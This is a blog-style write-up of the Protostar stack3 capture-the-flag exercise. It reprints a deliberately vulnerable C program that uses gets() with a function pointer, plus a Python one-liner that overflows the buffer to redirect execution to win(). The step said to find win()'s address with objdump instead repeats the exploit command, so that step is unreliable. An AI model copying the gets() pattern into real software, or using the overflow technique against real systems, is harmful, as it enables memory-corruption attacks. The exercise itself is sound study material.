---
layout: post
title: "Protostar stack03 writeup"
tags: [protostar, pwn]
comments: false
---

We are given a source code for this challenge.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
Similar idea from the other challenges but this one you have to overwrite the win() function's address after the overflow

First we need to find the address of win() you can do that with objdump -t
```
root@protostar:/opt/protostar/bin# (python -c 'print "A"*64+"\x24\x84\x04\x08"') | ./stack3
calling function pointer, jumping to 0x08048424
```

Then overflow with "A"*64+"\x24\x84\x04\x08"
```
root@protostar:/opt/protostar/bin# (python -c 'print "A"*64+"\x24\x84\x04\x08"') | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
